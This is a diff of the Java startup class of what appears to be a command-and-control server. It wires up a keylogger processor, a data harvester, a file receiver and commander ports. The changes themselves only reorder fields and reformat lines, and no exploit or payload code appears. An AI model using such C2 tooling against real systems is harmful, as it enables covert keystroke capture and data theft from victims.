@@ -25,6 +25,19 @@ import c2.session.log.IOLogger;
 import c2.tcp.filereceiver.FileReceiverSessionReceiver;
 
 public class Runner {
+	private ExecutorService service;
+	private IOManager ioManager;
+	private Properties properties;
+	private KeyloggerProcessor keylogger;
+
+	private List<C2Interface> interfaces = new ArrayList<>();
+	private List<Future<?>> runningServiceFutures = new ArrayList<>();
+
+	private CountDownLatch startupLatch = new CountDownLatch(1);
+	private CountDownLatch deathLatch = new CountDownLatch(1);
+
+	private HarvestProcessor harvester;
+
 	public static void main(String args[]) throws InterruptedException, ExecutionException {
 
 		try (InputStream input = new FileInputStream(args[0])) {
@@ -43,19 +56,6 @@ public class Runner {
 
 	}
 
-	private ExecutorService service;
-	private IOManager ioManager;
-	private Properties properties;
-	private KeyloggerProcessor keylogger;
-
-	private List<C2Interface> interfaces = new ArrayList<>();
-	private List<Future<?>> runningServiceFutures = new ArrayList<>();
-
-	private CountDownLatch startupLatch = new CountDownLatch(1);
-	private CountDownLatch deathLatch = new CountDownLatch(1);
-
-	private HarvestProcessor harvester;
-
 	public void awaitFullStartup() {
 		try {
 			startupLatch.await();
@@ -63,7 +63,7 @@ public class Runner {
 			// meh, don't worry about it
 		}
 	}
-	
+
 	public void awaitFullShutdown() {
 		try {
 			deathLatch.await();
@@ -118,7 +118,6 @@ public class Runner {
 				Integer.parseInt(properties.getProperty(Constants.EXPECTEDMAXCLIENTREPORTINGINTERVAL)));
 		theOnlyOne.setMultiplesOfExpectedMaxClientReportingToWait(
 				Integer.parseInt(properties.getProperty(Constants.MULTIPLESEXPECTEDMAXCLIENTREPORTINGINTERVAL)));
-		
 
 		int listenPort = Integer.parseInt(properties.getProperty(Constants.COMMANDERPORT));
 		service = Executors.newCachedThreadPool();
@@ -132,9 +131,11 @@ public class Runner {
 			cl = new CommandLoader(new HashMap<>(), new HashMap<>(), new ArrayList<>());
 		}
 
-		FileReceiverSessionReceiver receiver = new FileReceiverSessionReceiver(Integer.parseInt(properties.getProperty(Constants.FILERECEIVERPORT)), Paths.get("test", "fileReceiverTest"));
+		FileReceiverSessionReceiver receiver = new FileReceiverSessionReceiver(
+				Integer.parseInt(properties.getProperty(Constants.FILERECEIVERPORT)),
+				Paths.get("test", "fileReceiverTest"));
 		service.execute(receiver);
-		
+
 		IOLogger logger = new IOLogger(Paths.get(properties.getProperty(Constants.HUBLOGGINGPATH)));
 		ioManager = new IOManager(logger, cl);
 
@@ -154,8 +155,9 @@ public class Runner {
 				properties.getProperty(Constants.DAEMONLZHARVEST));
 		cmm.initializeMacros(properties);
 		ioManager.setCommandMacroManager(cmm);
-		
-		SessionManager sessionManager = new SessionManager(ioManager, listenPort, Integer.parseInt(properties.getProperty(Constants.SECURECOMMANDERPORT)), cmm, properties);
+
+		SessionManager sessionManager = new SessionManager(ioManager, listenPort,
+				Integer.parseInt(properties.getProperty(Constants.SECURECOMMANDERPORT)), cmm, properties);
 
 		Future<?> session = service.submit(sessionManager);
 
